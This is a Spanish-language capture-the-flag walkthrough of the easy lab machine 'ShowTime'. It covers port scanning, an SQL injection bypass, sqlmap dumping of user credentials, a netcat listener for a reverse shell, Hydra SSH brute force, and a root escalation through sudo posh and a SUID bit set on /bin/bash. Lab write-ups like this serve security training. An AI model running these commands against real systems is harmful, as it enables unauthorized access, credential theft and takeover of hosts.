---
description: '✍️ Autor: maciiii___ 🔍 Dificultad: Fácil  📅 Fecha de creación: 24/07/2024'
---

# ShowTime

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (818).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (819).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web del Casino.

<figure><img src="../../.gitbook/assets/image (820).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios y archivos con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt
```

Hacemos una **inyección SQL** básica en el directorio `/login_page`.

```bash
' OR '1'='1
```

<figure><img src="../../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (822).png" alt=""><figcaption></figcaption></figure>

Realizamos este comando para identificar bases de datos.

```bash
sqlmap -u http://172.17.0.2/login_page/index.php --forms --dbs --batch
```

<figure><img src="../../.gitbook/assets/image (823).png" alt=""><figcaption></figcaption></figure>

Ahora para ver las tablas dentro de la base de datos de **users**.

```bash
sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users --tables --batch
```

<figure><img src="../../.gitbook/assets/image (825).png" alt=""><figcaption></figcaption></figure>

Ahora vemos las columnas dentro de la tabla de **usuarios**.

```bash
sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios --columns --batch
```

<figure><img src="../../.gitbook/assets/image (824).png" alt=""><figcaption></figcaption></figure>

Ahora vemos la información que hay guardada en los registros.

```bash
sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios -C password,id,username --dump --batch
```

<figure><img src="../../.gitbook/assets/image (826).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con el tercer usuario nos logueamos y nos sale un panel de administración en el que podemos ejecutar un comando en **Python**.

<figure><img src="../../.gitbook/assets/image (827).png" alt=""><figcaption></figcaption></figure>

Nos ponemos en escucha para recibir la Reverse Shell.

```bash
nc -nlvp 443
```

<figure><img src="../../.gitbook/assets/image (828).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos con SUDO.

En el directorio `/tmp` hay una archivo del texto oculto.

<figure><img src="../../.gitbook/assets/image (829).png" alt=""><figcaption></figcaption></figure>

Creamos un diccionario pasando de mayúsculas a minúsculas para realizar la fuerza bruta.

```bash
tr '[:upper:]' '[:lower:]' < trucos.txt > diccionario.txt
```

Realizamos el ataque de fuerza bruta mediante **Hydra**.

```bash
hydra -l joe -P diccionario.txt ssh://172.17.0.2 -t 64
```

<figure><img src="../../.gitbook/assets/image (830).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con esas credenciales encontradas.

```bash
ssh joe@172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (831).png" alt=""><figcaption></figcaption></figure>

Tenemos permisos **SUDO** con **posh** por lo que miramos esta [página ](https://gtfobins.github.io/gtfobins/posh/)para ver como escalar privilegios.

```bash
sudo -u luciano /bin/posh
```

<figure><img src="../../.gitbook/assets/image (832).png" alt=""><figcaption></figcaption></figure>

En el directorio de **luciano** principal encontramos un script que no podemos editar con nano ni con vim por lo que lo hacemos con echo.

<figure><img src="../../.gitbook/assets/image (833).png" alt=""><figcaption></figcaption></figure>

```bash
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > script.sh
```

Ahora ejecutamos el script para ser **root**.

```bash
sudo -u root /bin/bash /home/luciano/script.sh 
```

Ejecutamos.

```bash
bash -p
```

<figure><img src="../../.gitbook/assets/image (834).png" alt=""><figcaption></figcaption></figure>
